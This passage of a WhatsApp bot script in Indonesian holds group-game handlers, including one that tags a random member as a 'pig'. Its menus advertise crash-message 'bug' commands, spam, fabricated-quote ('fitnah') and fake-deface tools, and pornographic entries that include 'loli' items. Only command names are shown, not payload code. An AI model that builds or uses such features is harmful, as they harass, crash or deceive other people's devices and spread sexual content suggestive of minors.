              buffer = await getBuffer(`https://i.ibb.co/X4cnYk9/4558413e1873.jpg`)
              Hisnu.sendMessage(from, buffer, image, { quoted: mek, caption: '*Dare*\n\n'+ der })
              break		
       case 'jadian':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              jds = []
              jdii = groupMembers
              koss = groupMembers
              akuu = jdii[Math.floor(Math.random() * jdii.length)]
              diaa = koss[Math.floor(Math.random() * koss.length)]
              teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]}  (♥️ ) @${diaa.jid.split('@')[0]} `
              jds.push(akuu.jid)
              jds.push(diaa.jid)
              mentions(teks, jds, true)
              break
       case 'cantik':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              membr = []
              const mes = groupMembers
              const msk = groupMembers
              const siaps = mes[Math.floor(Math.random() * mes.length)]
              const sips = pushname[Math.floor(Math.random() * msk.length)]
              teks = `*Yang Paling Cantik Disini Adalah :* @${siaps.jid.split('@')[0]}`
              membr.push(siaps.jid)
              mentions(teks, membr, true)
              break
       case 'ganteng':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              membr = []
              const nus = groupMembers
              const msl = groupMembers
              const siapss = nus[Math.floor(Math.random() * nus.length)]
              const sipss = pushname[Math.floor(Math.random() * msl.length)]
              teks = `*Masih Gantengan Owner Gua :* @${siapss.jid.split('@')[0]}`
              membr.push(siapss.jid)
              mentions(teks, membr, true)
              break
       case 'babi':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              membr = []
              const meg = groupMembers
              const mge = groupMembers
              const ba = meg[Math.floor(Math.random() * meg.length)]
              const bi = pushname[Math.floor(Math.random() * mge.length)]
              teks = `*Yang Paling Babi Disini Adalah :* @${ba.jid.split('@')[0]}`
              membr.push(ba.jid)
              mentions(teks, membr, true)
              break
       
//------------------< Lainnya >-------------------
        case 'getpp':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) {
               linkpp = await Hisnu.getProfilePicture(from) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
               buffer = await getBuffer(linkpp)
               Hisnu.sendMessage(from, buffer, image, {caption: "Nih", quoted: mek })
               } else if (mek.message.extendedTextMessage.contextInfo.mentionedJid === null || mek.message.extendedTextMessage.contextInfo.mentionedJid === undefined) {
               mberr = mek.message.extendedTextMessage.contextInfo.participant
               linkpp = await Hisnu.getProfilePicture(mberr) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
               buffer = await getBuffer(linkpp)
               Hisnu.sendMessage(from, buffer, image, { quoted: mek, caption: `Profile Picture of @${mberr.split("@")[0]}`, contextInfo: { "mentionedJid": [mberr] }})
               } else if (mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0) {
               mberr = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
               linkpp = await Hisnu.getProfilePicture(mberr) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
               buffer = await getBuffer(linkpp)
               Hisnu.sendMessage(from, buffer, image, { quoted: mek, caption: `Profile Picture of @${mberr.split("@")[0]}`, contextInfo: { "mentionedJid": [mberr] }})
}
               break
        case 'd':
        case 'del':
        case 'delete': // MR.CYSER
               try {
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply chat bot')
               Hisnu.deleteMessage(from, {id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true})
               } catch (e){
               reply('Reply chat bot')
}
               break
            case 'lokmenu':
            case 'menubaru':
       menu = `HALO
╭─❒ 「 MENU BARU 」 ❒
│ ⬡ Creator : ${owner}
│ ⬡ Recode : ${owner}
│ ⬡ Battery :  ${baterai}%
│ ⬡ Mode : ${banChats ? "𝑺𝑬𝑳𝑭-𝑴𝑶𝑫𝑬" : "𝑷𝑼𝑩𝑳𝑰𝑪-𝑴𝑶𝑫𝑬"}
│ ⬡ Total Hit : Dua belas
│ ⬡ Prefix : Multi Prefix
└❏

╭─❒ 「 Bot Info 」 ❒
│ ⬡ Nama Bot : 𝑩𝒐𝒕𝒛 𝑫𝒉𝒂𝒏𝒊☕︎
│ ⬡ Nama Owner : ${owner}
│ ⬡ Nomor Owner : ${ownerName}
│ ⬡ Auto Composing : OFF
│ ⬡ Auto Recording : OFF
└❏

╭─❒ INDONESIA TIME
│ ⬡ Wib : ${time}
│ ⬡ Wita : ${timeMak}
│ ⬡ Wit : ${timeJay}  
└❏

╭─❒ COMMAND
│
├❒ OWNER
├ ${prefix}stopjadibot (KU KUNCI)
├ ${prefix}autorespon
├ ${prefix}bc 
├ ${prefix}tobc 
├ ${prefix}return 
├ ${prefix}clearall
├ ${prefix}delchat
├ ${prefix}mute
├ ${prefix}unmute
├ ${prefix}public
├ ${prefix}self
├ ${prefix}spam 
├ ${prefix}demoteall
├ ${prefix}promoteall
├ ${prefix}addcmd 
├ ${prefix}delcmd 
├ ${prefix}listcmd
├ ${prefix}spamsw 
├ ${prefix}upswteks 
├ ${prefix}upswlokasi 
├ ${prefix}upswaudio 
├ ${prefix}upswvoice 
├ ${prefix}upswsticker
├ ${prefix}upswimage 
├ ${prefix}upswgif 
├ ${prefix}upswvideo 
├ ${prefix}shutdown
├ ${prefix}afk 
├ ${prefix}online
├ ${prefix}exif 
├ ${prefix}setprofile 
├ ${prefix}setname 
├ ${prefix}setprefix 
├ ${prefix}setbio 
├ ${prefix}addsticker 
├ ${prefix}delsticker 
├ ${prefix}addvn 
├ ${prefix}delvn 
├ ${prefix}addimage 
├ ${prefix}delimage 
├ ${prefix}bug 
├ ${prefix}bugpc2 
├ ${prefix}bugtroli2 
├ ${prefix}bugtroli3
├ ${prefix}bugpc
├ ${prefix}bugcombine
├ ${prefix}bugtroli
├ ${prefix}buglokasi
├ ${prefix}bughole
├ ${prefix}leave
├ ${prefix}restart
├ ${prefix}join 
├ ${prefix}addrespon 
├ ${prefix}delrespon 
│
├❒ DOWNLOAD
├ ${prefix}infogempa
├ ${prefix}herolist
├ ${prefix}herodetail
├ ${prefix}google 
├ ${prefix}gimage 
├ ${prefix}wiki 
├ ${prefix}mediafire 
├ ${prefix}ytsearch
├ ${prefix}ytmp4 
├ ${prefix}ytmp3 
├ ${prefix}play 
├ ${prefix}video 
├ ${prefix}tinyurl 
├ ${prefix}fetch 
├ ${prefix}igdl 
├ ${prefix}tiktokdl 
├ ${prefix}pinterest
├ ${prefix}lirik 
├ ${prefix}tourl 
├ ${prefix}resepmasakan 
├ ${prefix}artimimpi 
├ ${prefix}bilangangka 
├ ${prefix}kalkulator 
├ ${prefix}fancytext 
├ ${prefix}githubstalk 
├ ${prefix}translate 
├ ${prefix}ss 
│
├❒ MAKER
├ ${prefix}matrix 
├ ${prefix}googletxt 
├ ${prefix}spiderman 
├ ${prefix}express 
├ ${prefix}dance 
├ ${prefix}blackbird 
├ ${prefix}halloween 
├ ${prefix}vampire 
├ ${prefix}codetxt 
├ ${prefix}text3d 
├ ${prefix}warrior 
│
├❒ GROUP
├ ${prefix}getpict 
├ ${prefix}getname 
├ ${prefix}getbio 
├ ${prefix}promote 
├ ${prefix}demote 
├ ${prefix}antilink 
├ ${prefix}nsfw
├ ${prefix}creategrup 
├ ${prefix}tictactoe 
├ ${prefix}delttt
├ ${prefix}getpp
├ ${prefix}kick 
├ ${prefix}add 
├ ${prefix}getdeskgc
├ ${prefix}sider 
├ ${prefix}hacked
├ ${prefix}setnamegc 
├ ${prefix}setdeskgc 
├ ${prefix}fitnah 
├ ${prefix}kontak 
├ ${prefix}kontag 
├ ${prefix}opengc
├ ${prefix}closegc
├ ${prefix}resetlinkgc
├ ${prefix}linkgrup
├ ${prefix}hidetag 
├ ${prefix}sticktag 
├ ${prefix}totag 
│
├❒ NSFW *(PROSES)*
├ ${prefix}trapnime
├ ${prefix}neko
├ ${prefix}megumin
├ ${prefix}blowjob
├ ${prefix}hentai
├ ${prefix}awoo
├ ${prefix}bj 
├ ${prefix}eroneko
├ ${prefix}lesbian
├ ${prefix}anal
├ ${prefix}yuri
├ ${prefix}baka
├ ${prefix}neko2
├ ${prefix}wallpaper
├ ${prefix}pussy
├ ${prefix}kitsune
├ ${prefix}keta
├ ${prefix}neko2
├ ${prefix}poke
├ ${prefix}slap
│
├❒ OTHER
├ ${prefix}getscmd
├ ${prefix}jadibot
├ ${prefix}caripesan 
├ ${prefix}slots
├ ${prefix}suit  
├ ${prefix}tag 
├ ${prefix}tagme
├ ${prefix}tts 
├ ${prefix}readmore
├ ${prefix}fitnahpc
├ ${prefix}chat
├ ${prefix}fdeface 
├ ${prefix}listimage
├ ${prefix}liststicker
├ ${prefix}listvn
├ ${prefix}listgrup
├ ${prefix}baileys 
├ ${prefix}q 
├ ${prefix}getcaption 
├ ${prefix}pantun
├ ${prefix}tospam 
├ ${prefix}sharelock 
├ ${prefix}sticker
├ ${prefix}stickerwm
├ ${prefix}takestick
├ ${prefix}colong 
├ ${prefix}dadu
├ ${prefix}semoji 
├ ${prefix}attp 
├ ${prefix}toimg
├ ${prefix}tomp3 
├ ${prefix}tomp4 
├ ${prefix}robot 
├ ${prefix}balik 
├ ${prefix}bass 
├ ${prefix}gemuk 
├ ${prefix}detikvn 
├ ${prefix}detikvideo 
└─────────────────❒
${menu}`
buttons = [{buttonId: `${prefix}command`,buttonText:{displayText: 'COMMAND'},type:1},{buttonId:`${prefix}allmenu`,buttonText:{displayText:'ALLMENU'},type:1},{buttonId: `${prefix}rules`,buttonText:{displayText: 'RULES'},type:1},{buttonId:`${prefix}allmenu`,buttonText:{displayText:'ALLMENU'},type:1}]

  imageMsg = (await Hisnu.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', {thumbnail: fs.readFileSync(`./media/Menu.jpg`)})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText: '㋡𝐾𝑢𝑛𝑧𝐵𝑜𝑡𝑧', imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}
            
               prep = await Hisnu.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli, contextInfo:{ mentionedJid: parseMention(menu), externalAdReply: {
							title: `Hai ${pushname} 👋`,
							body: `${tanggal}`,
							previewType: 1,
							thumbnailUrl: "https://i.ibb.co/X4cnYk9/4558413e1873.jpg",
							thumbnail: fs.readFileSync('./media/Nakano.jpg'), }, forwardingScore:508, isForwarded:true, mentionedJid:[Tag + '@s.whatsapp.net', senderr]}})
                            Hisnu.relayWAMessage(prep)
                            break
            case 'allmenu':
uptime = process.uptime();
timestampe = speed();
latensie = speed() - timestampe 
yuu = `${runtime(process.uptime())}` 
buf = fakeimage
imeu = await Hisnu.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
res = await Hisnu.prepareMessageFromContent(from,{
"productMessage": {
"product": {
"productImage": imeg,
"productId": "150453297177375",
"title": `ALL MENU`,
"description": `𝐁𝐎𝐓𝐙 𝐃𝐇𝐀𝐍𝐈

*🤖 𝑪𝒓𝒆𝒂𝒕𝒐𝒓 :* @${owner}
*🤖 𝑩𝒂𝒕𝒓𝒆𝒂𝒊 :* ${baterai}%
*🤖 𝑷𝒓𝒆𝒇𝒊𝒙 :* 𝑴𝒖𝒍𝒕𝒊-𝑷𝒓𝒆𝒇𝒊𝒙
*🤖 𝑮𝒓𝒖𝒑 𝑻𝒐𝒕𝒂𝒍 :* ${groups.length}
*🤖 𝑷𝒓𝒊𝒗𝒂𝒕𝒆 𝑪𝒉𝒂𝒕 :* ${privat.length}
*🤖 𝑻𝒐𝒕𝒂𝒍 𝑪𝒉𝒂𝒕 :* ${totalChat.length}
*🤖 𝑺𝒑𝒆𝒆𝒅 :* ${latensie.toFixed(4)} 𝒔𝒆𝒄𝒄𝒐𝒏𝒅
*🤖 𝑩𝒐𝒕 𝑴𝒐𝒅𝒆 :* ${banChats ? "𝑺𝑬𝑳𝑭-𝑴𝑶𝑫𝑬" : "𝑷𝑼𝑩𝑳𝑰𝑪-𝑴𝑶𝑫𝑬"}
*🤖 𝑭𝒊𝒕𝒖𝒓 :* 550 𝒇𝒊𝒕𝒖𝒓

*𒍮𝑰𝒏𝒇𝒐 𝒖𝒔𝒆𝒓*
*💰 𝑳𝒆𝒗𝒆𝒍 :* ${levelRole}
*💰 𝑳𝒊𝒎𝒊𝒕 :* Unlimited
*💰 𝑩𝒂𝒍𝒂𝒏𝒄𝒆 :* Rp.870
*💰 𝑵𝒐𝒎𝒐𝒓 :* wa.me/${sender.replace('@s.whatsapp.net', '')}

╭──────「 𝙏𝙤𝙥 𝙐𝙥 𝘿𝙢 」
├ 𝐷𝑖𝑎𝑚𝑜𝑛𝑑 𝐹𝑟𝑒𝑒 𝐹𝑖𝑟𝑒
├ 𝐷𝑖𝑎𝑚𝑜𝑛𝑑 𝑀𝑜𝑏𝑖𝑙𝑒 ??𝑒𝑔𝑒𝑛𝑑𝑠
╰───

 ❏ 𝐽𝑖𝑘𝑎 𝑀𝑖𝑛𝑎?? 𝐾𝑒𝑡𝑖𝑘 #𝑜𝑟𝑑𝑒𝑟 
 
 
*⌕ 𝑰𝒏𝒅𝒐𝒏𝒆𝒔𝒊𝒂𝒔 𝑻𝒊𝒎𝒆 ☪︎*
*⏰ ${time} 𝑾𝑰𝑩* ⏰
*⏰ ${timeMak} 𝑾𝑰𝑻𝑨* ⏰
*⏰ ${timeJay} 𝑾𝑰𝑻* ⏰

 *𝑰𝑵𝑭𝑶 𝑴𝑬𝑵𝑼🌹*
 
⚡ᴄᴇᴋᴘʀᴇғɪx
⚡${prefix}ʙᴏᴛsᴛᴀᴛ
⚡${prefix}ʟɪᴍɪᴛ
⚡${prefix}ɢʟɪᴍɪᴛ
⚡${prefix}ʙᴜʏʟɪᴍɪᴛ <ᴀɴɢᴋᴀ>
⚡${prefix}ʙᴜʏɢʟɪᴍɪᴛ <ᴀɴɢᴋᴀ>
⚡${prefix}ʙᴀʟᴀɴᴄᴇ
⚡${prefix}ʀᴜɴᴛɪᴍᴇ
⚡${prefix}sᴘᴇᴇᴅ
⚡${prefix}ᴏᴡɴᴇʀ
⚡${prefix}ᴅᴏɴᴀsɪ
⚡${prefix}ʀᴜʟᴇs
⚡${prefix}ʀᴇᴘᴏʀᴛ <ʙᴜɢ ɴʏᴀ>
⚡${prefix}sᴏᴜʀᴄᴇᴄᴏᴅᴇ
⚡${prefix}ʟɪsᴛᴘʀᴇᴍɪᴜᴍ
⚡${prefix}ᴛᴀɢᴍᴇ
⚡${prefix}ʟɪsᴛʙᴀɴ
⚡${prefix}ʟɪsᴛʙᴏᴛ
⚡${prefix}sɴᴋ

 *𝑵𝑬𝑾 𝑭𝑰𝑻𝑼𝑹🌹*
 
🎬${prefix}ᴘᴀɴᴅᴀ
🎬${prefix}ᴘᴀɴᴅᴀ1
🎬${prefix}ʙɪʀᴅ
🎬${prefix}ᴋᴏᴀʟᴀ
🎬${prefix}ᴅᴀʀᴋᴊᴏᴋᴇs
🎬${prefix}ᴀᴍᴏɴɢᴜs <ᴛᴇᴋs>
🎬${prefix}ᴛᴛs <ᴋᴏᴅᴇ ʙᴀʜᴀsᴀ>
🎬${prefix}ʏᴛɢᴏʟᴅ <ᴛᴇᴋs>
🎬${prefix}ʏᴛsɪʟᴠᴇʀ <ᴛᴇᴋs>
🎬${prefix}ʟᴏɢᴏᴀ <ᴛᴇᴋs&ᴛᴇᴋs>
🎬${prefix}pornhub <ᴛᴇᴋs&ᴛᴇᴋs>
🎬${prefix}ᴛᴀʜᴛᴀ <ᴛᴇᴋs>
🎬${prefix}ᴍᴀʀᴠᴇʟ <ᴛᴇᴋs&ᴛᴇᴋs
🎬${prefix}ᴡᴀʟʟ <ᴛᴇᴋs>
🎬${prefix}ᴛᴜᴘᴀɪ <ʀᴇᴘʟʏ ᴀᴜᴅɪᴏ>
🎬${prefix}ʙᴀss <ʀᴇᴘʟʏ ᴀᴜᴅɪᴏ>
🎬${prefix}ɢʜᴏsᴛ <ʀᴇᴘʟʏ ᴀᴜᴅɪᴏ>
🎬${prefix}ɢᴇᴍᴏᴋ <ʀᴇᴘʟʏ ᴀᴜᴅɪᴏ>
🎬${prefix}ғᴀsᴛ <ʀᴇᴘʟʏ ᴀᴜᴅɪᴏ>


 *𝑶𝑾𝑵𝑬𝑹 𝑴𝑬𝑵𝑼🌹*
 
☃️> ᴇᴠᴀʟ
☃️$ ᴇxᴇᴄᴏᴛ
☃️+<>+ <ᴋᴜᴅᴇᴛ>
☃️${prefix}sᴇʟғ
☃️${prefix}ᴘᴜʙʟɪᴄ
☃️${prefix}ʀᴇsᴛᴀʀᴛ
☃️${prefix}ᴀɴᴛɪᴛᴀɢ <ᴏɴ/ᴏғ>
☃️${prefix}ᴏɴ
☃️${prefix}ᴏғғ
☃️${prefix}ʀᴇsᴇᴛʟɪᴍɪᴛ
☃️${prefix}sᴇᴛᴘᴘ
☃️${prefix}sᴇᴛɴᴀᴍᴇ
☃️${prefix}sᴇᴛʙɪᴏ
☃️${prefix}sᴇᴛᴘʀᴇғɪx
☃️${prefix}ʙᴄ
☃️${prefix}ʙʟᴏᴄᴋ
☃️${prefix}ᴜɴʙʟᴏᴄᴋ
☃️${prefix}ʙᴀɴ
☃️${prefix}ᴜɴʙᴀɴ
☃️${prefix}ᴄʟᴇᴀʀᴀʟʟ
☃️${prefix}sᴇᴛᴄᴍᴅ
☃️${prefix}ᴅᴇʟᴄᴍᴅ
☃️${prefix}ᴇxɪғ <ɴᴀᴍᴀ|ᴀᴜᴛʜᴏʀ>
☃️${prefix}ᴀᴅᴅsᴇᴡᴀ <ʟɪɴᴋ|ᴡᴀᴋᴛᴜ>
☃️${prefix}ᴅᴇʟsᴇᴡᴀ <ɪᴅ ɢʀᴜᴘ>
☃️${prefix}ᴀᴅᴅᴘʀᴇᴍ <ᴛᴀɢ|ᴡᴀᴋᴛᴜ>
☃️${prefix}ᴅᴇʟᴘʀᴇᴍ <ᴛᴀɢ>

 *𝑶𝑻𝑯𝑬𝑹 𝑴𝑬𝑵𝑼🌹*
 
🏮${prefix}ʙʀᴀɪɴʟʏ
🏮${prefix}sʜᴏᴘᴇᴇ
🏮${prefix}ᴘʟᴀʏsᴛᴏʀᴇ
🏮${prefix}ssᴡᴇʙ
🏮${prefix}ɪᴍᴀɢᴇ
🏮${prefix}ɢᴏᴏɢʟᴇ
🏮${prefix}ᴘɪɴᴛᴇʀᴇsᴛ
🏮${prefix}ɴᴜʟɪs
🏮${prefix}ɪɢᴜsᴇʀ
🏮${prefix}ɪɢsᴛᴀʟᴋ
🏮${prefix}ɢɪᴛʜᴜʙsᴛᴀʟᴋ
🏮${prefix}ᴛɪᴋᴛᴏᴋsᴛᴀʟᴋ
🏮${prefix}ɪᴍɢ2ᴜʀʟ
🏮${prefix}ʏᴛsᴇᴀʀᴄʜ
🏮️${prefix}ʀᴇᴀᴅᴍᴏʀᴇ <ᴛᴇxᴛ𝟷|ᴛᴇxᴛ𝟸>

 𝑷𝑯𝑶𝑻𝑶 𝑶𝑿𝒀🌹

📸${prefix}ᴄᴀʀᴠᴇᴅᴡᴏᴏᴅ <ᴛᴇᴋs>
📸${prefix}ʜᴀʀʀʏᴘᴏᴛᴛᴇʀ <ᴛᴇᴋs>
📸${prefix}ғʟᴀᴍᴍɪɴɢ <ᴛᴇᴋs>
📸${prefix}ғᴀʟʟʟᴇᴀᴠᴇs <ᴛᴇᴋs>
📸${prefix}ɢʟᴏᴡɪɴɢɴᴇᴏɴ <ᴛᴇᴋs>
📸${prefix}ʟᴇᴛᴛᴇʀʟᴇᴀᴠᴇs <ᴛᴇᴋs>
📸${prefix}sᴜᴍᴍᴇʀɴᴀᴛᴜʀᴇ <ᴛᴇᴋs>
📸${prefix}ɢᴏʟᴅᴇʀʀᴏsᴇ <ᴛᴇᴋs>
📸${prefix}ᴜɴᴅᴇʀᴡᴀᴛᴇʀ <ᴛᴇᴋs>
📸${prefix}ɴᴀᴛᴜʀᴇ3ᴅ <ᴛᴇᴋs>
📸${prefix}ᴡᴏʟғᴍᴇɴᴛᴀʟ <ᴛᴇᴋs>
📸${prefix}sᴜᴍᴍᴇʀ3ᴅ <ᴛᴇᴋs>
📸${prefix}ᴡᴏᴏᴅᴇɴʙᴏᴀʀᴅ <ᴛᴇᴋs>
📸${prefix}ᴡᴏᴏᴅʜᴇᴀʀᴛ <ᴛᴇᴋs>
📸${prefix}ᴄᴏғғᴇ <ᴛᴇᴋs>
📸${prefix}ᴜɴᴅᴇʀɢʀᴀss <ᴛᴇᴋs>
📸${prefix}ʟᴏᴠᴇᴍᴇssᴀɢᴇ <ᴛᴇᴋs>
📸${prefix}ʙᴜʀɴᴘᴀᴘᴇʀ <ᴛᴇᴋs>
📸${prefix}sᴍᴏᴋᴇ <ᴛᴇᴋs>
📸${prefix}ʀᴏᴍᴀɴᴄᴇ <ᴛᴇᴋs>
📸${prefix}ᴄᴜᴘ <ᴛᴇᴋs>
📸${prefix}ᴄᴜᴘ1 <ᴛᴇᴋs>
📸${prefix}sʜᴀᴅᴏᴡ <ᴛᴇᴋs>

 𝑻𝑬𝑿𝑻𝑷𝑹𝑶𝑴𝑬🌹

🎄${prefix}ɴᴇᴏɴʟɪɢʜᴛ <ᴛᴇᴋs>
🎄${prefix}ʙʟᴀᴄᴋᴘɪɴᴋ <ᴛᴇᴋs>
🎄${prefix}ɴᴇᴏɴ <ᴛᴇᴋs>
🎄${prefix}ɢʀᴇᴇɴɴᴇᴏɴ <ᴛᴇᴋs>
🎄${prefix}ᴀᴅᴠᴀɴᴄᴇɢʟᴏᴡ <ᴛᴇᴋs>
🎄${prefix}ғᴜᴛᴜʀᴇɴᴇᴏɴ <ᴛᴇᴋs>
🎄${prefix}sᴀɴᴅᴡʀɪᴛɪɴɢ <ᴛᴇᴋs>
🎄${prefix}sᴀɴᴅsᴜᴍᴍᴇʀ <ᴛᴇᴋs>
🎄${prefix}sᴀɴᴅᴇɴɢʀᴀᴠᴇᴅ <ᴛᴇᴋs>
🎄${prefix}ᴍᴇᴛᴀʟᴅᴀʀᴋ <ᴛᴇᴋs>
🎄${prefix}ʜᴏʟᴏɢʀᴀᴘʜɪᴄ <ᴛᴇᴋs>
🎄${prefix}ᴛᴇxᴛ1917 <ᴛᴇᴋs>
🎄${prefix}ᴍɪɴɪᴏɴ <ᴛᴇᴋs>
🎄${prefix}ᴅᴇʟᴜxᴇsɪʟᴠᴇʀ <ᴛᴇᴋs>
🎄${prefix}ɴᴇᴡʏᴇᴀʀᴄᴀʀᴅ <ᴛᴇᴋs>
🎄${prefix}ʙʟᴏᴏᴅғʀᴏsᴛᴇᴅ <ᴛᴇᴋs>
🎄${prefix}ʜᴀʟʟᴏᴡᴇɴ <ᴛᴇᴋs>
🎄${prefix}ᴊᴏᴋᴇʀʟᴏɢᴏ <ᴛᴇᴋs>
🎄${prefix}ғɪʀᴇᴡᴏʀᴋsᴘᴀʀᴋʟᴇ <ᴛᴇᴋs>
🎄${prefix}ɴᴀᴛᴜʀᴇʟᴇᴀᴠᴇs <ᴛᴇᴋs>
🎄${prefix}ʙᴏᴋᴇʜ <ᴛᴇᴋs>
🎄${prefix}ᴛᴏxɪᴄ <ᴛᴇᴋs>
🎄${prefix}sᴛʀᴀᴡʙᴇʀʀʏ <ᴛᴇᴋs>
🎄${prefix}ʙᴏx3ᴅ <ᴛᴇᴋs>
🎄${prefix}ʀᴏᴀᴅᴡᴀʀɴɪɴɢ <ᴛᴇᴋs>
🎄${prefix}ʙʀᴇᴀᴋᴡᴀʟʟ <ᴛᴇᴋs>
🎄${prefix}ɪᴄᴇᴄᴏʟᴅ <ᴛᴇᴋs>
🎄${prefix}sᴜᴍᴍᴇʀsᴀɴᴅ <ᴛᴇᴋs>
🎄${prefix}ʜᴏʀʀᴏʀʙʟᴏᴏᴅ <ᴛᴇᴋs>
🎄${prefix}ᴛʜᴜɴᴅᴇʀ <ᴛᴇᴋs>

 𝑬𝑷𝑯𝑶𝑻𝑶 𝟑𝟔𝟎🌹

🌐${prefix}ғʀᴇᴇғɪʀᴇ <ᴛᴇᴋs>
🌐${prefix}sɴᴏᴡ3ᴅ <ᴛᴇᴋs>
🌐${prefix}ʙɪʀᴛᴅᴀʏᴅᴀʏ <ᴛᴇᴋs>
🌐${prefix}ɢᴀʟᴀxʏʙᴀᴛ <ᴛᴇᴋs>
🌐${prefix}ᴡʀɪᴛᴇɢᴀʟᴀᴄʏ <ᴛᴇᴋs>  
🌐${prefix}ᴛᴇxᴛʙʏɴᴀᴍᴇ <ᴛᴇᴋs>
🌐${prefix}ᴡᴏᴏᴅᴇɴ3ᴅ <ᴛᴇᴋs> 
🌐${prefix}sᴛᴀʀsɴɪɢʜᴛ <ᴛᴇᴋs>
🌐${prefix}ᴛᴇxᴛᴄᴀᴋᴇ <ᴛᴇᴋs>  
🌐${prefix}ɢʟɪᴛᴛᴇʀɢᴏʟᴅ <ᴛᴇᴋs>
🌐${prefix}ɴᴏᴇʟᴛᴇxᴛ <ᴛᴇᴋs> 
🌐${prefix}ᴍᴇᴛᴀʟʟᴏɢᴏ <ᴛᴇᴋs>
🌐${prefix}ɢʀᴇᴇɴʙᴜsʜ <ᴛᴇᴋs>
🌐${prefix}ɢʀᴇᴇɴɴᴇᴏɴ <ᴛᴇᴋs>
🌐${prefix}ɢʟᴏssʏᴄʜʀᴏᴍᴇ <ᴛᴇᴋs>  
🌐${prefix}ʜᴏʟᴏɢʀᴀᴍ3ᴅ <ᴛᴇᴋs>
🌐${prefix}ɢᴀʟᴀxʏsᴛʏʟᴇ <ᴛᴇᴋs>  
🌐${prefix}ʙʀɪᴛʜᴅᴀʏᴄᴀᴋᴇ <ᴛᴇᴋs>
🌐${prefix}ʜᴇᴀʀᴛsʜᴀᴘᴇᴅ <ᴛᴇᴋs> 
🌐${prefix}ʀᴏʏᴀʟᴛᴇxᴛ <ᴛᴇᴋs>
🌐${prefix}ᴘᴜᴘᴘʏᴄᴜᴛᴇ <ᴛᴇᴋs>
🌐${prefix}ʙᴇᴀᴜᴛɪғᴜʟғʟᴏᴡᴇʀ <ᴛᴇᴋs>  
🌐${prefix}ʟɪɢʜᴛᴛᴇxᴛ <ᴛᴇᴋs>
🌐${prefix}ɢᴀʟᴀxʏᴡᴀʟʟᴘᴀᴘᴇʀ <ᴛᴇᴋs>
🌐${prefix}ʟᴜxᴜʀʏɢᴏʟᴅ <ᴛᴇᴋs>
🌐${prefix}ᴡᴀᴛᴇʀᴄᴏʟᴏʀ <ᴛᴇᴋs>
🌐${prefix}ᴍᴜʟᴛɪᴄᴏʟᴏʀ3ᴅ <ᴛᴇᴋs>  
🌐${prefix}ᴡᴇᴛɢʟᴀss <ᴛᴇᴋs>

 *𝑺𝑶𝑼𝑵𝑫 𝑴𝑬𝑵𝑼🌹*
 
🎶${prefix}sᴏᴜɴᴅ
🎶${prefix}sᴏᴜɴᴅ1
🎶${prefix}sᴏᴜɴᴅ2
🎶${prefix}sᴏᴜɴᴅ3
🎶${prefix}sᴏᴜɴᴅ4
🎶${prefix}sᴏᴜɴᴅ5
🎶${prefix}sᴏᴜɴᴅ6
🎶${prefix}sᴏᴜɴᴅ7
🎶${prefix}sᴏᴜɴᴅ8
🎶${prefix}sᴏᴜɴᴅ9
🎶${prefix}sᴏᴜɴᴅ10
🎶${prefix}sᴏᴜɴᴅ11
🎶${prefix}sᴏᴜɴᴅ12
🎶${prefix}sᴏᴜɴᴅ13
🎶${prefix}sᴏᴜɴᴅ14
🎶${prefix}sᴏᴜɴᴅ15
🎶${prefix}sᴏᴜɴᴅ16
🎶${prefix}sᴏᴜɴᴅ17
🎶${prefix}sᴏᴜɴᴅ18
🎶${prefix}sᴏᴜɴᴅ19
🎶${prefix}sᴏᴜɴᴅ20

 *𝑩𝑶𝑲𝑬𝑷 𝑴𝑬𝑵𝑼🌹*
 
🌚${prefix}ᴋᴏᴅᴇɴᴜᴋʟɪʀ
🌚${prefix}ʟɪɴᴋʙᴏᴋᴇᴘ
🌚${prefix}ɴᴇᴋᴏᴘᴏɪ1
🌚${prefix}ɴᴇᴋᴏᴘᴏɪ2
🌚${prefix}ɴᴇᴋᴏᴘᴏɪ4
🌚${prefix}ɴᴇᴋᴏᴘᴏɪ5
🌚${prefix}ɴᴇᴋᴏᴘᴏɪ6
🌚${prefix}ɴᴇᴋᴏᴘᴏɪ7
🌚${prefix}ɴᴇᴋᴏᴘᴏɪ8
🌚${prefix}ɴᴇᴋᴏᴘᴏɪ9
🌚${prefix}ʀᴀɴᴅᴏᴍʙᴏᴋᴇᴘ

*𝑾𝑰𝑩𝑼 𝑴𝑬𝑵𝑼🌹*
 
🧄${prefix}ʟᴏʟɪ
🧄${prefix}ᴍᴀɴɢᴀ
🧄${prefix}ᴀɴɪᴍᴇ
🧄${prefix}ʟᴏʟɪᴠɪᴅᴇᴏ
🧄${prefix}ʜᴜsʙᴜ
🧄${prefix}ᴡᴀɪғᴜ
🧄${prefix}ᴍɪʟғ
🧄${prefix}ɴᴇᴋᴏ
🧄${prefix}ᴋᴀɴɴᴀ
🧄${prefix}sᴀɢɪʀɪ
🧄${prefix}ʜᴇɴᴛᴀɪ
🧄${prefix}ᴄᴏsᴘʟᴀʏ
🧄${prefix}ᴡᴀʟʟɴɪᴍᴇ
🧄${prefix}ᴋᴜsᴏɴɪᴍᴇ
